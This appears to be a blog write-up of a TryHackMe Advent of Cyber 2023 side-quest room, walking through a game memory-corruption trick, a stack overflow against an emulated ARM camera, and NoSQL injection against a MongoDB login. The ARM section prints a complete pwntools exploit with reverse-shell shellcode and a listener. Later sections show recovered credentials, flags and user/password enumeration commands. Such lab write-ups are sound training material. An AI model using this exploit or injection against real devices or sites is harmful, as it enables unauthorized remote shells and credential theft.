---
title: Advent Of Cyber (sq2)
author: reds
date: 2023-12-11 23:11
tags: [cybersecurity, ctf, writeup, TryHackMe, bof]
pin: false
hidden: false
---

# [SQ2: Snowy ARMageddon](https://tryhackme.com/room/armageddon2r)

This room was part of the series of Advent Of Cyber 2023 from TryHackMe. It's a Linux machine cataloged as "insane".

![|350](content/blog/writeups/aoc23-sq/sq2_head.png)

First we will gain access to the room through a QR code that we will obtain by exploiting a simple buffer overflow in a pixel game. Secondly we will use a payload written in python and arm assembly for creating a reverse shell. Finally we will do a NOSQL injection for getting credentials form MongoDB.


## Pixel Game - Memory Corruption

The URL for the room was hidden in the task from the **day 6** from the [main event of Advent Of Cyber](https://tryhackme.com/room/adventofcyber2023).
It was a pixel game where you have to exploit a simple buffer overflow.

It is a game in which the main character can interact with a computer to obtain up to 16 coins, which he can use to change his name or buy items in a store.
We can see how the game memory is distributed, where 12 bytes are designated to store the name variable. However, if we enter a longer name, the additional bytes go to occupy the next variable, which in this case are the game coins.

![Game Memory|300](content/blog/writeups/aoc23-sq/game_memory.png)

We also can buy items on the shop, but we notice there's a missing one corresponding to letter `a`, and if we try to buy it, the shopper tell us that we don't have enough coins.

We can try to get a large amount of coins by modifying the memory of the game. For doing so we can use the ASCII to hex table, and also a decimal to hex [online converter](https://www.rapidtables.com/convert/number/hex-to-decimal.html) .

![|400](content/blog/writeups/aoc23-sq/ASCII_table.png)

As we can see in the table, the symbol `~` corresponds to the maximum hexadecimal value that we can type, so we enter 12 random characters for the name and 4 additional bytes that will overwrite the value of coins on the memory. By entering the name `aaaabbbbcccc~~~~` we get `2122219134` coins.

![Memory Corruption (1)|400](content/blog/writeups/aoc23-sq/memory_corruption_1.gif)

Now we can successfully buy the item "a", which is a token of Yeti, and suddenly a "spirit" called G.O.C.P appears:
> *According to the legend, a **cat named Snowball** will arrive at this place one day. He will meet **Midas the greedy merchant**, and **Ted the name switcher**. He'll bring **exactly 31337 coins** and the **token of the Yeti**. When all these conditions are met, input the **30 lives secret code** and what's hidden shall be revealed.*

The inventory should look like this:

```
player_name  S n o w
             b a l l
             ∅ ∅ ∅ ∅
      coins  i z ∅ ∅  # 31337
 shopk_name  M i d a
             s ∅ ∅ ∅
             ∅ ∅ ∅ ∅
 namer_name  T e d ∅
             ∅ ∅ ∅ ∅
             ∅ ∅ ∅ ∅
   inv_items 1 ∅ ∅ ∅
             ∅ ∅ ∅ ∅
             ∅ ∅ ∅ ∅
             ∅ ∅ ∅ ∅
```

Notice how the game adds a NULL character (`∅`) after your bytes, and it really doesn't matter what's next. Also notice the decimal value 31337 in hex is `7A 69` but because it is stored in little endian it should be `69 7A`, corresponding to `z i` in ASCII.
1. Remove the christmas ball from inventory: `aaaaaaaaaaaabbbbccccccccccccddddddddddddeeeef` & `aaaaaaaaaaaabbbbccccccccccccddddddddddddeeee`
2. Get enough coins to buy the yeti token: `~~~~~~~~~~~~~~~~` (`~`x16)
3. Rename the namer: `aaaaaaaaaaaabbbbccccccccccccTed`
4. Rename the shopk:  `aaaaaaaaaaaabbbbMidas`
5. Set 31337 + 8 coins = `71 7A` = `q z`: `,...,...,...qzz` and again `,...,...,...qz`
6. Rename player (expend 8 coins): `Snowball`
   
The [Konami Code](https://en.wikipedia.org/wiki/Konami_Code), also commonly referred to as the Contra Code and sometimes the **30 Lives code**: `↑↑↓↓←→←→BA`

![Memory Corruption (2)|400](content/blog/writeups/aoc23-sq/memory_corruption_2.gif)


---

## ARM Camera - Assembly

### nmap

We start scanning all ports from the machine with `nmap`:
```bash
nmap -Pn -n -sS --min-rate=5000 -p- $IP -oN allPorts -vv
```

```
PORT      STATE SERVICE
22/tcp    open  ssh
23/tcp    open  telnet
8080/tcp  open  http-proxy
50628/tcp open  unknown
```

And we try to get more information about the ones that are open by running the default nmap scripts and also the version of that services (`-sCV` on target ports):
```bash
nmap -Pn -n -sS --min-rate=5000 -sCV -p 22,23,8080,50628 $IP -oN targetPorts -vv
```

### Port 50628

At port 50628 there is a web app, which emulates an ARM camera.

![Camera at port 50628 |350](content/blog/writeups/aoc23-sq/camera_50628.png)

A deep search on the [internet](https://armx.exploitlab.net/docs/debugging-with-armx.html) reveals it is part of the [EMUX (formerly ARMX) Firmware Emulation Framework](https://armx.exploitlab.net/). The source code of the docker container can be found on [GitHub](https://github.com/therealsaumil/armx).

#### Exploitation
Exploit: https://no-sec.net/arm-x-challenge-breaking-the-webs/
Compiler: https://cpulator.01xz.net/?sys=arm

> Stack overflow can be triggered by providing a long string value for the “basic” GET parameter.

```python
from pwn import *
 
HOST = '192.168.100.2'
PORT = 50628
 
buffer = cyclic(1000)
s = remote('192.168.100.2', 50628)
s.send(b'GET /en/login.asp?basic=' + buffer + b' HTTP/1.0\r\n\r\n')
s.close
```

> Reverse Shell written in assembly for the ARM camera

```armasm
.section .text
.global _start  
_start:
    /* Move stack pointer above overwritten saved LR */
    sub sp, #16
    /* BINSH */
    mov r1, #0x68
    lsl r1, #8
    add r1, #0x73
    lsl r1, #8
    add r1, #0x2f
    push {r1}       // /sh
    mov r1, #0x6e
    lsl r1, #8
    add r1, #0x69
    lsl r1, #8
    add r1, #0x62
    lsl r1, #8
    add r1, #0x2f
    push {r1}       // /bin
    /* ADDR */
    mov r1, #0x164
    lsl r1, #8
    add r1, #0xa8
    lsl r1, #8
    add r1, #0xc0
    push {r1}       // 192.168.100.1
    mov r1, #0x5c
    lsl r1, #8
    add r1, #0x11
    lsl r1, #16
    add r1, #0x02
    push {r1}       // 4444; AF_INET, SOCK_STREAM
    /* execve */
    mov r3, #0xef
    lsl r3, #24
    push {r3}       // svc  #0
    /* ... */
    mov r1, #0xe3
    lsl r1, #8
    add r1, #0xa0
    lsl r1, #8
    add r1, #0x10
    lsl r1, #8
    add r1, #0x01
    push {r1}       // mov  r1, #1
    /* jump to shellcode */
    bx sp
```

> By compiling the assembly code, one can extract the according shellcode and place it inside e.g. a Python script for gaining a reverse root shell

```python
from pwn import *
   
HOST = '192.168.100.2'
PORT = 50628
LHOST = [192,168,100,1]
LPORT = 4444
 
BADCHARS = b'\x00\x09\x0a\x0d\x20\x23\x26'
BAD = False
LIBC_OFFSET = 0x40021000
LIBGCC_OFFSET = 0x4000e000
RETURN = LIBGCC_OFFSET + 0x2f88    # libgcc_s.so.1: bx sp   0x40010f88
SLEEP = LIBC_OFFSET + 0xdc54       # sleep@libc 0x4002ec54
 
pc = cyclic_find(0x63616176)  # 284
r4 = cyclic_find(0x6361616f)  # 256
r5 = cyclic_find(0x63616170)  # 260
r6 = cyclic_find(0x63616171)  # 264
r7 = cyclic_find(0x63616172)  # 268
r8 = cyclic_find(0x63616173)  # 272
r9 = cyclic_find(0x63616174)  # 276
r10 = cyclic_find(0x63616175) # 280
sp = cyclic_find(0x63616177)  # 288
 
SC  = b'\x10\xd0\x4d\xe2'     # sub sp, 16
SC += b'\x68\x10\xa0\xe3\x01\x14\xa0\xe1\x73\x10\x81\xe2\x01\x14\xa0\xe1\x2f\x10\x81\xe2\x04\x10\x2d\xe5\x6e\x10\xa0\xe3\x01\x14\xa0\xe1\x69\x10\x81\xe2\x01\x14\xa0\xe1\x62\x10\x81\xe2\x01\x14\xa0\xe1\x2f\x10\x81\xe2\x04\x10\x2d\xe5'      # /bin/sh
SC += b'\x59\x1f\xa0\xe3\x01\x14\xa0\xe1\xa8\x10\x81\xe2\x01\x14\xa0\xe1\xc0\x10\x81\xe2\x04\x10\x2d\xe5'   # 192.168.100.1
SC += b'\x5c\x10\xa0\xe3\x01\x14\xa0\xe1\x11\x10\x81\xe2\x01\x18\xa0\xe1\x02\x10\x81\xe2\x04\x10\x2d\xe5'   # 4444; AF_INET, SOCK_STREAM
SC += b'\xef\x30\xa0\xe3\x03\x3c\xa0\xe1\x04\x30\x2d\xe5\xe3\x10\xa0\xe3\x01\x14\xa0\xe1\xa0\x10\x81\xe2\x01\x14\xa0\xe1\x70\x10\x81\xe2\x01\x14\xa0\xe1\x0b\x10\x81\xe2\x04\x10\x2d\xe5\xe1\x10\xa0\xe3\x01\x14\xa0\xe1\xa0\x10\x81\xe2\x01\x14\xa0\xe1\x10\x10\x81\xe2\x01\x14\xa0\xe1\x0c\x10\x81\xe2\x01\x10\x81\xe2\x04\x10\x2d\xe5\xe9\x10\xa0\xe3\x01\x14\xa0\xe1\x2d\x10\x81\xe2\x01\x18\xa0\xe1\x05\x10\x81\xe2\x04\x10\x2d\xe5\xe0\x10\xa0\xe3\x01\x14\xa0\xe1\x22\x10\x81\xe2\x01\x14\xa0\xe1\x1f\x10\x81\xe2\x01\x10\x81\xe2\x01\x14\xa0\xe1\x02\x10\x81\xe2\x04\x10\x2d\xe5\xe2\x10\xa0\xe3\x01\x14\xa0\xe1\x8f\x10\x81\xe2\x01\x18\xa0\xe1\x18\x10\x81\xe2\x04\x10\x2d\xe5'   # execve()
SC += b'\x04\x30\x2d\xe5\xe3\x10\xa0\xe3\x01\x14\xa0\xe1\xa0\x10\x81\xe2\x01\x14\xa0\xe1\x10\x10\x81\xe2\x01\x14\xa0\xe1\x02\x10\x81\xe2\x04\x10\x2d\xe5\xe1\x10\xa0\xe3\x01\x14\xa0\xe1\xa0\x10\x81\xe2\x01\x18\xa0\xe1\x0b\x10\x81\xe2\x04\x10\x2d\xe5'   # dup2(STDERR)
SC += b'\x04\x30\x2d\xe5\xe3\x10\xa0\xe3\x01\x14\xa0\xe1\xa0\x10\x81\xe2\x01\x14\xa0\xe1\x10\x10\x81\xe2\x01\x14\xa0\xe1\x01\x10\x81\xe2\x04\x10\x2d\xe5\xe1\x10\xa0\xe3\x01\x14\xa0\xe1\xa0\x10\x81\xe2\x01\x18\xa0\xe1\x0b\x10\x81\xe2\x04\x10\x2d\xe5'   # dub2(STDOUT)
SC += b'\x04\x30\x2d\xe5\xe2\x10\xa0\xe3\x01\x14\xa0\xe1\x87\x10\x81\xe2\x01\x14\xa0\xe1\x70\x10\x81\xe2\x01\x14\xa0\xe1\x0e\x10\x81\xe2\x04\x10\x2d\xe5\xe3\x10\xa0\xe3\x01\x14\xa0\xe1\xa0\x10\x81\xe2\x01\x14\xa0\xe1\x70\x10\x81\xe2\x01\x14\xa0\xe1\x31\x10\x81\xe2\x04\x10\x2d\xe5\xe0\x10\xa0\xe3\x01\x14\xa0\xe1\x21\x10\x81\xe2\x01\x14\xa0\xe1\x10\x10\x81\xe2\x01\x14\xa0\xe1\x01\x10\x81\xe2\x04\x10\x2d\xe5\xe1\x10\xa0\xe3\x01\x14\xa0\xe1\xa0\x10\x81\xe2\x01\x18\xa0\xe1\x0b\x10\x81\xe2\x04\x10\x2d\xe5'   # dup2(STDIN)
SC += b'\x04\x30\x2d\xe5\xe2\x10\xa0\xe3\x01\x14\xa0\xe1\x87\x10\x81\xe2\x01\x14\xa0\xe1\x70\x10\x81\xe2\x01\x14\xa0\xe1\x1c\x10\x81\xe2\x04\x10\x2d\xe5\xe3\x10\xa0\xe3\x01\x14\xa0\xe1\xa0\x10\x81\xe2\x01\x14\xa0\xe1\x70\x10\x81\xe2\x01\x14\xa0\xe1\xff\x10\x81\xe2\x04\x10\x2d\xe5\xe3\x10\xa0\xe3\x01\x14\xa0\xe1\xa0\x10\x81\xe2\x01\x14\xa0\xe1\x1f\x10\x81\xe2\x01\x10\x81\xe2\x01\x14\xa0\xe1\x10\x10\x81\xe2\x04\x10\x2d\xe5\xe2\x10\xa0\xe3\x01\x14\xa0\xe1\x8f\x10\x81\xe2\x01\x14\xa0\xe1\x10\x10\x81\xe2\x01\x14\xa0\xe1\x50\x10\x81\xe2\x04\x10\x2d\xe5\xe1\x10\xa0\xe3\x01\x14\xa0\xe1\xa0\x10\x81\xe2\x01\x14\xa0\xe1\xb0\x10\x81\xe2\x01\x14\xa0\xe1\x04\x10\x2d\xe5'   # connect()
SC += b'\x04\x30\x2d\xe5\xe2\x10\xa0\xe3\x01\x14\xa0\xe1\x87\x10\x81\xe2\x01\x14\xa0\xe1\x70\x10\x81\xe2\x01\x14\xa0\xe1\x1a\x10\x81\xe2\x04\x10\x2d\xe5\xe3\x10\xa0\xe3\x01\x14\xa0\xe1\xa0\x10\x81\xe2\x01\x14\xa0\xe1\x70\x10\x81\xe2\x01\x14\xa0\xe1\xff\x10\x81\xe2\x04\x10\x2d\xe5\xe0\x10\xa0\xe3\x01\x14\xa0\xe1\x22\x10\x81\xe2\x01\x14\xa0\xe1\x1f\x10\x81\xe2\x01\x10\x81\xe2\x01\x14\xa0\xe1\x02\x10\x81\xe2\x04\x10\x2d\xe5\xe2\x10\xa0\xe3\x01\x14\xa0\xe1\x81\x10\x81\xe2\x01\x18\xa0\xe1\x01\x10\x81\xe2\x04\x10\x2d\xe5\xe3\x10\xa0\xe3\x01\x14\xa0\xe1\xa0\x10\x81\xe2\x01\x14\xa0\xe1\x10\x10\x81\xe2\x01\x14\xa0\xe1\x01\x10\x81\xe2\x04\x10\x2d\xe5'   # socket()
#SC += b'\x01\x0c\xa0\xe3'   # mov r0, #256  ; sleep for 256s to avoid cache coherency issues
#SC += b'\x3a\xff\x2f\xe1'   # blx r10       ; r10 contains address of sleep@libc
SC += b'\x1d\xff\x2f\xe1'   # bx sp
 
info('Shellcode length: %d' % len(SC))
for i in range(len(SC)):
  if SC[i] in BADCHARS:
    print('BAD CHARACTER in position: %d!')
    BAD = True
if BAD:
  exit(1)
 
buffer  = b'A' * r10
buffer += p32(SLEEP)    # overwrite r10 with address of sleep()
buffer += p32(RETURN)   # bx sp
buffer += SC
 
s = remote('192.168.100.2', 50628)
s.send(b'GET /en/login.asp?basic=' + buffer + b' HTTP/1.0\r\n\r\n')
 
nc = listen(LPORT)
nc.wait_for_connection()
nc.interactive()
s.close()
nc.close()
```

The problem here is that we need to adjust the script so it matches our local IP address, and it has to be written in assembly too.

For the default IP: `192.168.100.1` (dec) `c0.a8.64.01` (hex), the assembly code is
```armasm
59 1F A0 E3    mov r1, #0x164
01 14 A0 E1    lsl r1, r1, #8
A8 10 81 E2    add r1, r1, #0xa8
01 14 A0 E1    lsl r1, r1, #8
C0 10 81 E2    add r1, r1, #0xc0
04 10 2D E5    str r1, [sp, #-4]!
```

Which corresponds with the following line from the python reverse shell:
```python
#SC += b'\x59\x1f\xa0\xe3\x01\x14\xa0\xe1\xa8\x10\x81\xe2\x01\x14\xa0\xe1\xc0\x10\x81\xe2\x04\x10\x2d\xe5'   # 192.168.100.1
SC += b'\x59\x1f\xa0\xe3'
SC += b'\x01\x14\xa0\xe1'
SC += b'\xa8\x10\x81\xe2'
SC += b'\x01\x14\xa0\xe1'
SC += b'\xc0\x10\x81\xe2'
SC += b'\x04\x10\x2d\xe5'
```

We only need to change the IP address from the exploit to our THM IP, in my case `10.9.129.243` which is `0a.09.81.f3` in hexadecimal.

```python
SC += b'\xf3\x10\xa0\xe3'    # mov r1, #243
SC += b'\x01\x14\xa0\xe1'    # lsl r1, #8
SC += b'\x81\x10\x81\xe2'    # add r1, #129
SC += b'\x01\x14\xa0\xe1'    # lsl r1, #8
SC += b'\x08\x10\x81\xe2'    # add r1, #0x08
SC += b'\x01\x10\x81\xe2'    # add r1, #0x01    //(1+8)
SC += b'\x01\x14\xa0\xe1'    # lsl r1, #8
SC += b'\x08\x10\x81\xe2'    # add r1, #0x08
SC += b'\x02\x10\x81\xe2'    # add r1, #0x02    //(2+8, 10 is bad char)
SC += b'\x04\x10\x2d\xe5'    # push {r1}
```

> The guy who wrote the exploit identified the bad characters (which usually cut the character row on stack) by consecutively crafting a buffer with 284 `A`’s (in order to trigger a crash) and append the bytes `0x01` to `0xff` to it. 
> Checking the stack values, once the crash occurs, the following bad characters can be found: `0x00 0x09 0x0a 0x0d 0x20 0x23 0x26`.

So that's why when I should have to write `10`and a `9` for my IP, I had to do it by adding two values to the stack, since `0a` and `09` are "bad characters".

The `Optcode` that is written on the python exploit can be obtained using an [online compiler](Cybersecurity/TryHackMe/rooms/adventofcyber2023/sidequest/sq2/writeup.md#^w575k9).

#### \[Optional\]: Locally compiling assembly
I would like to know how to do the assembly part without the online tool.
On a docker container, I tried to build the arm compiler:
1. `apt install gcc-arm-none-eabi`
2. Assemble: `arm-none-eabi-as -mfloat-abi=soft -march=armv7-a -mcpu=cortex-a9 -mfpu=neon-fp16 --gdwarf2 myRevSh.s -o myRevSh.o`
3. Link (not needed here): `arm-none-eabi-ld -e _start -u _start myRevSh.o -o myRevSh.elf`
4. Use `radare2` to obtain the `optcode` for the python script. **???***




---

```sh
$ cat /.emux/.nfs00000000000fb07f00000001
#!/bin/sh
rm -f /dev/abs628
touch /dev/abs628
/etc/init.d/rc.sysinit
sed -i 's/password=admin/password=Y3tiStarCur!ous&/' /var/etc/umconfig.txt
/etc/init.d/rc 3
/bin/sh


$ cd /var/etc                                           
$ grep -i pass . -r
./umconfig.txt:password=Y3tiStarCur!ouspassword=admin
```

Go to `$IP:50628` and log in with username=`admin` and password=`Y3tiStarCur!ouspassword=admin`
**Flag 1**: `THM{YETI_ON_SCREEN_ELUSIVE_CAMERA_STAR}`


### Enabling telnet connection (optional)
Once you are in the camera, run `telnetd` and in another shell connect to telnet `telnet $IP 23` with credentials `root:Y3tiStarCur!ous&`


### Accessing port 8080 **locally**
Because *"Access is strictly forbidden for non-elves"*

```bash
curl -u user:pass IP:PORT
curl -u admin:Y3tiStarCur!ouspassword=admin 10.10.26.166:8080
```

## MongoDB - NoSQLi
### Port 8080

Login form at http://$IP:8080/login.php/ (notice the final `/`)
- `/.DS_Store` hints it's nosql db
- Review NoSQLi: [THM - NoSQL injection Basics](https://tryhackme.com/room/nosqlinjectiontutorial)
- NoSQL enumeration: https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration
	- Users: `python3 nosqli-user-pass-enum.py -u http://$IP:8080/login.php/ -up username -pp password -ep username -op login:login,submit:submit -m POST`
      
	```
	7 username(s) found:
	Blizzardson
	Frostbite
	Grinchowski
	Iciclevich
	Northpolinsky
	Scroogestein
	Tinselova
	```
      
	- Passwords: `python3 nosqli-user-pass-enum.py -u http://$IP:8080/login.php/ -up username -pp password -ep password -op login:login,submit:submit -m POST`
    
	```
	6Ne2HYXUovEIVOEQg2US
	7yIcnHu8HC6QCH1MCfHS
	advEpXUBKt3bZjk3aHLR
	h1y6zpVTOwGYoB95aRnk
	jlXUuZKIeCONQQIe92GZ
	rCwBuLJPNzmRGExQucTC
	tANd8qZ93sFHUBrJhdQj
	uwx395sm4GpVfqQ4dUDI
	E33v0lTuUVa1ct4sSed1
	F6Ymdyzx9C1QeNOcU7FD
	HoHoHacked
	JZwpMOTmDvVYDq3uSb3t
	NlJt6HBZBG3olEphq8gr
	ROpPXouppjXNf2pmmT0Q
	UZbIt6L41BmLeQJF0gAR
	WmLP5OZDiLos16Ie1owB
	```
